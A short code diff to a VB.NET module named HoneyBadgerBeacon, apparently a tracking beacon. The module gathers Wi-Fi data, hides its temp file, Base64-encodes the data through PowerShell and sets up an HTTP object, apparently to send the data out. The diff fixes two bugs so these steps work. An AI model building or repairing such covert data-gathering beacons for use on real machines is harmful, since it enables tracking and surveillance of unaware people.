@@ -85,13 +85,13 @@ Module HoneyBadgerBeacon
 
         Dim objWriter As New System.IO.StreamWriter(Environ("temp") & "\wifidat.txt")
         objWriter.Write(wifi)
-        objWriter.Close(0)
+        objWriter.Close()
 
         wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
 
         Kill(Environ("temp") & "\wifidat.txt")
 
-        wifi = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF88.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+        wifi = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
 
         Dim objHTTP As New Object
         objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
